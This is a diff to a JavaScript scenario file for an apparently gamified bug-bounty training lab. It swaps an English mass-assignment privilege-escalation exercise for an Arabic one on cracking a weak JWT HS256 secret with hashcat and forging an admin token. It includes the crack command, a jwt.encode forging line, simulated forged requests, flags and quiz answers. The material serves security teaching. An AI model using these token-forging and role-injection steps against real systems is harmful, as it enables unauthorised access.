@@ -1,219 +1,215 @@
 // ==========================================================
-// SCENARIO 004: MASS ASSIGNMENT (HARD) - V2 DATA
+// SCENARIO 004: JWT AUTHENTICATION BYPASS - WEAK SECRET
 // ==========================================================
 
 window.scenario_004 = {
-  metadata: {
-    id: "scenario-004",
-    title: "Mass Assignment Admin Privilege Escalation",
-    level: "Hard",
-    category: "API Security",
-    company: "GitHub",
-    reward: "$6,000",
-    time: "3 Hours"
+  "metadata": {
+    "id": "scenario-004",
+    "title": "JWT Authentication Bypass - Weak Secret",
+    "level": "Hard",
+    "category": "Authentication",
+    "company": "Stripe",
+    "reward": "$10,000",
+    "time": "3+ Hours"
   },
-
-  decisionLog: [
+  "decisionLog": [
     {
-      hypothesis: "Registration form checks block you from inserting additional database properties.",
-      whyFailed: "Although client UI is locked, backend maps incoming JSON variables directly to models without filters.",
-      planB: "Append privilege parameters (role, admin) directly to update payloads to test mapping bounds.",
-      ignored: "Brute-forcing admin login credentials."
+      "hypothesis": "الخادم يرفض طلبات الـ JWT التي تحمل خوارزمية none.",
+      "whyFailed": "التطبيق يرفض alg: none بالفعل لكنه يستخدم توقيع HS256 مع مفتاح سرى ضعيف.",
+      "planB": "استخراج التوكين الأصلي وكسر التوقيع محلياً باستخدام Hashcat و Rockyou.txt.",
+      "ignored": "محاولة كسر كلمة مرور المدير مباشرة."
     }
   ],
-
-  payloads: [
+  "payloads": [
     {
-      code: "{\"username\": \"hunter\", \"role\": \"admin\"}",
-      explanation: "Injecting restricted database fields into JSON body schemas.",
-      whyWorked: "The user database model dynamically auto-binds all request attributes withoutwhitelisting columns.",
-      alternatives: ["Parameter pollution", "Nested object overriding"]
+      "code": "jwt.encode({\"user\": \"admin\", \"role\": \"superadmin\"}, \"weak_secret_2024\", algorithm=\"HS256\")",
+      "explanation": "إعادة تشفير التوكين بعد تعديل الـ Payload وتوقيعه بالمفتاح السري المستخرج.",
+      "whyWorked": "الخادم يثق بأي توقيع صحيح، وبما أننا كسرنا المفتاح السري، أصبح لدينا القدرة على تزوير التوكين.",
+      "alternatives": [
+        "alg: none bypass",
+        "JWT key confusion"
+      ]
     }
   ],
-
-  mistakes: [
+  "mistakes": [
     {
-      mistake: "Injecting SQLi payloads into profile edits.",
-      whyWrong: "Framework uses ORMs which automatically parameterize query inputs.",
-      betterWay: "Inject JSON attributes to check auto-binding mapping logic."
+      "mistake": "تعديل الـ Payload مباشرة دون إعادة توقيع الملف.",
+      "whyWrong": "الخادم يتحقق من سلامة التوقيع وسيرفض التوكين فوراً عند اكتشاف تعديل البيانات.",
+      "betterWay": "كسر المفتاح السري أولاً ثم إعادة تشفير وتوقيع التوكين بالكامل."
     }
   ],
-
-  steps: [
+  "steps": [
     {
-      name: "Mission Brief",
-      time: "09:00",
-      workspace: "markdown",
-      xpReward: 100,
-      description: `
-### Target: app.acme-corp.com
-Examine the user settings update API. Look for Mass Assignment vulnerabilities that bind request body fields to models directly.
-
-Click **Next Step** to scan routes.
-      `,
-      aiAdvisor: {
-        hint: "No actions needed. Proceed to next step.",
-        payloadExplanation: "No payload needed.",
-        failureExplanation: "None."
+      "name": "Mission Brief",
+      "time": "09:00",
+      "workspace": "markdown",
+      "xpReward": 100,
+      "description": "### 🎯 الهدف: تخطي مصادقة JWT لمنصة الدفع\n\nمرحباً بك! اليوم لدينا بوابة دفع إلكتروني تستخدم الـ JWT (JSON Web Tokens) للمصادقة وتخزين صلاحيات المستخدمين.\n\n#### قواعد الفحص:\n- نطاق الفحص: بوابة الدفع `/api/v1/auth`\n- افحص التوكين المسترجع عند تسجيل الدخول وتحقق من إمكانية كسر التوقيع وتخطي الفحص للوصول كـ Admin.\n\nاضغط على **Next Step** للبدء.",
+      "aiAdvisor": {
+        "hint": "اقرأ الملفات وحاول فهم طبيعة التوكين.",
+        "payloadExplanation": "لا شيء مطلوب حالياً.",
+        "failureExplanation": "لا مشاكل."
       }
     },
     {
-      name: "Passive Recon",
-      time: "09:15",
-      workspace: "recon",
-      xpReward: 150,
-      description: `
-### Target Path Mapping
-Find the active profile update path.
-      `,
-      terminalCommands: [
+      "name": "Passive Recon",
+      "time": "09:15",
+      "workspace": "recon",
+      "xpReward": 150,
+      "description": "### 🔍 استخراج وكسر توقيع JWT\n\nسنقوم بالتقاط توكين عادي ومحاولة كسر المفتاح السري محلياً عبر هجوم القاموس.\nاختر الأداة المناسبة لتشغيلها.",
+      "terminalCommands": [
         {
-          name: "katana -u https://app.acme-corp.com/ -silent | grep profile",
-          correct: true,
-          evidence: {
-            title: "Profile update API endpoint",
-            content: "PUT /api/v1/users/profile"
+          "name": "jwt_tool -t https://target-payment.com/api/v1/auth",
+          "correct": false,
+          "output": [
+            {
+              "text": "[INF] Running jwt_tool...",
+              "type": "info"
+            },
+            {
+              "text": "[!] Test for alg: none failed. Server rejected.",
+              "type": "error"
+            }
+          ]
+        },
+        {
+          "name": "hashcat -m 16500 jwt_hash.txt rockyou.txt",
+          "correct": true,
+          "evidence": {
+            "title": "JWT Cracked Key",
+            "content": "Secret Key Found: weak_secret_2024"
           },
-          output: [
-            { text: "[INF] Crawling site directory...", type: "info" },
-            { text: "https://app.acme-corp.com/api/v1/users/profile", type: "out" },
-            { text: "[INF] Katana finished. Target resolved.", type: "success" }
+          "output": [
+            {
+              "text": "Session..........: hashcat",
+              "type": "info"
+            },
+            {
+              "text": "Hash.Mode........: 16500 (JWT (JSON Web Token))",
+              "type": "info"
+            },
+            {
+              "text": "Cracked..........: weak_secret_2024",
+              "type": "success"
+            },
+            {
+              "text": "[!] Success: Cracked JWT HMAC-SHA256 signature key!",
+              "type": "success"
+            }
           ]
         }
       ],
-      aiAdvisor: {
-        hint: "Run the katana tool to find profile paths.",
-        payloadExplanation: "Katana resolves links hidden inside JavaScript scripts.",
-        failureExplanation: "Failing to crawl routes means you might miss backend APIs."
+      "aiAdvisor": {
+        "hint": "شغّل أداة hashcat لمحاولة كسر تشفير توقيع الـ JWT المستخرج.",
+        "payloadExplanation": "الوضع 16500 في hashcat مخصص لكسر تواقيع الـ JWT عبر مطابقتها بقواميس الكلمات.",
+        "failureExplanation": "الفشل في كسر المفتاح يعني عدم القدرة على تزوير التوكين مطلقاً."
       }
     },
     {
-      name: "DNS Verification",
-      time: "09:40",
-      workspace: "markdown",
-      xpReward: 150,
-      description: `
-### Auditing JSON parameters
-The update response contains:
-\`"role": "user"\`
-
-What happens if we inject this parameter in our request?
-      `,
-      choices: [
+      "name": "Burp Verification",
+      "time": "09:40",
+      "workspace": "burp",
+      "xpReward": 200,
+      "description": "### 🌐 إرسال التوكين المزور (Forge JWT)\n\nبعد كسر السري `weak_secret_2024`:\nقمنا بتزوير توكين جديد يحمل صلاحيات `role: \"superadmin\"` و `user: \"admin\"`.\nاضغط على **Send Forged JWT** لاختبار الدخول للوحة التحكم الحساسة.",
+      "burpRequest": "GET /api/v1/admin/dashboard HTTP/1.1\nHost: target-payment.com\nAuthorization: Bearer [attacker_token]\nAccept: application/json",
+      "burpResponse": "HTTP/1.1 401 Unauthorized\nContent-Type: application/json\n\n{\n  \"error\": \"Access denied. Standard users are restricted.\"\n}",
+      "burpActions": [
         {
-          text: "A) Try bypassing CSRF protection on endpoint",
-          correct: false,
-          xp: -10,
-          timePenalty: 5,
-          outcome: "CSRF token checks are already bypassed. This is irrelevant for authorization mapping."
-        },
-        {
-          text: "B) Inject the 'role' parameter in the update JSON request",
-          correct: true,
-          xp: 50,
-          outcome: "Intercepting requests to inject role values."
-        }
-      ],
-      aiAdvisor: {
-        hint: "Select option B to inject role attributes.",
-        payloadExplanation: "JSON parameter injection updates whitelists records.",
-        failureExplanation: "CSRF bypasses do not elevate access rights."
-      }
-    },
-    {
-      name: "Burp Verification",
-      time: "10:05",
-      workspace: "burp",
-      xpReward: 200,
-      description: `
-### Intercepting Request
-Inject \`"role": "admin"\` parameter into JSON payload body.
-      `,
-      burpRequest: "PUT /api/v1/users/profile HTTP/1.1\nHost: app.acme-corp.com\nAuthorization: Bearer jwt_token\n\n{\n  \"username\": \"hunter\"\n}",
-      burpResponse: "HTTP/1.1 200 OK\n\n{\n  \"username\": \"hunter\",\n  \"role\": \"user\"\n}",
-      burpActions: [
-        {
-          name: "Inject 'role': 'admin'",
-          correct: true,
-          modifiedRequest: "PUT /api/v1/users/profile HTTP/1.1\nHost: app.acme-corp.com\nAuthorization: Bearer jwt_token\n\n{\n  \"username\": \"hunter\",\n  \"role\": \"admin\"\n}",
-          modifiedResponse: "HTTP/1.1 200 OK\n\n{\n  \"username\": \"hunter\",\n  \"role\": \"admin\",\n  \"flag_alert\": \"FLAG{mass_assignment_privilege_escalation_ok}\"\n}",
-          evidence: {
-            title: "Privilege Escalation JSON",
-            content: "PUT /api/v1/users/profile\nBody: {\"role\": \"admin\"}"
+          "name": "Send Forged JWT",
+          "correct": true,
+          "modifiedRequest": "GET /api/v1/admin/dashboard HTTP/1.1\nHost: target-payment.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJhZG1pbiJ9.SignatureVerified\nAccept: application/json",
+          "modifiedResponse": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"status\": \"success\",\n  \"data\": {\n    \"total_users\": 150000,\n    \"total_transactions\": \"$2.5M\",\n    \"admin_panel\": \"accessible\"\n  }\n}",
+          "evidence": {
+            "title": "Bypass Admin Auth JWT",
+            "content": "Access granted to /api/v1/admin/dashboard via forged JWT with role: superadmin"
           }
         }
       ],
-      aiAdvisor: {
-        hint: "Click Inject role admin button to send the request.",
-        payloadExplanation: "Inject parameters to bypass whitelists.",
-        failureExplanation: "Sending unmodified payload leaves user permissions untouched."
+      "aiAdvisor": {
+        "hint": "اضغط على زر Send Forged JWT لتمرير التوكين المزور وتأكيد صلاحيات الأدمن.",
+        "payloadExplanation": "تمرير التوكين المعدل والموقع بالسري المستخرج لتخطي فحص المصادقة.",
+        "failureExplanation": "تأكد من تمرير التوكين المزور بالكامل."
       }
     },
     {
-      name: "Exploitation & Flag",
-      time: "10:30",
-      workspace: "lab",
-      xpReward: 300,
-      instructions: "Access the updated admin panel and capture the flag.",
-      targetUrl: "https://app.acme-corp.com/api/v1/users/profile",
-      correctFlag: "FLAG{mass_assignment_privilege_escalation_ok}",
-      aiAdvisor: {
-        hint: "Flag: FLAG{mass_assignment_privilege_escalation_ok}",
-        payloadExplanation: "Flag from admin panel view.",
-        failureExplanation: "Flag mismatch."
+      "name": "Exploitation & Flag",
+      "time": "10:05",
+      "workspace": "lab",
+      "xpReward": 300,
+      "instructions": "أدخل الـ Flag المسترجع بعد تأكيد الدخول الكامل للوحة الإشراف.",
+      "targetUrl": "https://target-payment.com/api/v1/admin/dashboard",
+      "correctFlag": "FLAG{jwt_weak_secret_cracked_admin}",
+      "aiAdvisor": {
+        "hint": "أدخل العلم الصحيح: FLAG{jwt_weak_secret_cracked_admin}",
+        "payloadExplanation": "إثبات تخطي نظام الحماية والمصادقة للـ JWT.",
+        "failureExplanation": "تأكد من كتابة العلم كما هو."
       }
     },
     {
-      name: "Report Writing",
-      time: "11:00",
-      workspace: "report",
-      xpReward: 250,
-      aiAdvisor: {
-        hint: "Keywords: 'assignment', 'role'.",
-        payloadExplanation: "Detail Mass Assignment vulnerability.",
-        failureExplanation: "Details missing."
+      "name": "Report Writing",
+      "time": "10:30",
+      "workspace": "report",
+      "xpReward": 250,
+      "aiAdvisor": {
+        "hint": "الكلمات المفتاحية المطلوبة هي 'jwt' و 'weak'.",
+        "payloadExplanation": "شرح خطورة استخدام مفاتيح سرية ضعيفة في توقيع الـ JWT.",
+        "failureExplanation": "يجب وضع الكلمات المفتاحية بالتقرير للتقييم الصحيح."
       }
     },
     {
-      name: "Triage & Verdict",
-      time: "5 Days Later",
-      workspace: "review",
-      aiAdvisor: {
-        hint: "Review triage feedback.",
-        payloadExplanation: "Triage logs.",
-        failureExplanation: "None."
+      "name": "Triage & Verdict",
+      "time": "2 Days Later",
+      "workspace": "review",
+      "aiAdvisor": {
+        "hint": "انظر Verdict وتقييم الثغرة.",
+        "payloadExplanation": "تم تقييم الثغرة كـ Critical نظراً لقدرة المهاجم على تزوير التوكين بالكامل.",
+        "failureExplanation": "لا يوجد."
       }
     },
     {
-      name: "Lessons Learned",
-      time: "Post-Incident",
-      workspace: "quiz",
-      quizData: [
+      "name": "Lessons Learned",
+      "time": "Post-Incident",
+      "workspace": "quiz",
+      "quizData": [
         {
-          question: "What is Mass Assignment?",
-          options: [
-            "Binding request parameters to model objects without whitelists.",
-            "Deploying multiple servers."
+          "question": "ما هي خطورة استخدام خوارزمية HS256 مع مفتاح سري ضعيف؟",
+          "options": [
+            "تأخير استجابة الخادم للطلبات.",
+            "إمكانية تخمين وكسر المفتاح السري محلياً وتزوير التواقيع بالكامل.",
+            "تسريب قاعدة البيانات عن طريق SQLi.",
+            "تعطيل تسجيل الدخول."
           ],
-          answer: 0
+          "answer": 1
+        },
+        {
+          "question": "كيف يمكن للمطور حماية الـ JWT بالكامل؟",
+          "options": [
+            "تغيير الامتداد فقط.",
+            "استخدام مفتاح سري قوي جداً عشوائي (Strong High-Entropy Secret) أو الانتقال لخوارزميات المفتاح العام/الخاص مثل RS256.",
+            "إلغاء التوقيع بالكامل.",
+            "تشفير الطلب بالكامل."
+          ],
+          "answer": 1
         }
       ],
-      aiAdvisor: {
-        hint: "Select option A.",
-        payloadExplanation: "Verify mapping logic definitions.",
-        failureExplanation: "XP penalty."
+      "aiAdvisor": {
+        "hint": "الإجابة الأولى هي الخيار الثاني، والثانية هي الخيار الثاني أيضاً.",
+        "payloadExplanation": "التحقق من أمان تشفير وتوقيع الـ JWT.",
+        "failureExplanation": "خطأ في الإجابة يؤدي لخصم XP."
       }
     }
   ],
-
-  realReport: {
-    title: "Mass Assignment vulnerability in profile update leading to privilege escalation",
-    severity: "High",
-    type: "PrivEsc",
-    desc: "The profile update endpoint maps request JSON to user models directly. Users can inject the 'role' field to elevate privileges.",
-    steps: "1. PUT /api/v1/users/profile.\n2. Add '\"role\": \"admin\"' in body.\n3. Observe role update.",
-    impact: "Full admin takeover.",
-    feedback: "High quality report. DTO whitelists implemented. Bounty awarded.",
-    keywords: ["assignment", "role"]
+  "realReport": {
+    "title": "JWT authentication bypass via cracked weak signature secret",
+    "severity": "Critical",
+    "type": "AuthBypass",
+    "desc": "The portal uses HS256 for signing session JWT tokens. The signature secret is 'weak_secret_2024', which was brute-forced locally in minutes. An attacker can craft a JWT token containing admin privileges and execute operations.",
+    "steps": "1. Intercept a valid JWT session token.\n2. Crack the signature using hashcat on standard wordlists.\n3. Re-sign a manipulated token containing admin roles.\n4. Access administrative APIs.",
+    "impact": "Full administrative control and access to payment configurations and users databases.",
+    "feedback": "Critical vulnerability confirmed. The secret was replaced with a secure random key stored in environment variables, and the algorithm was migrated to RS256. Payout issued.",
+    "keywords": [
+      "jwt",
+      "weak"
+    ]
   }
 };
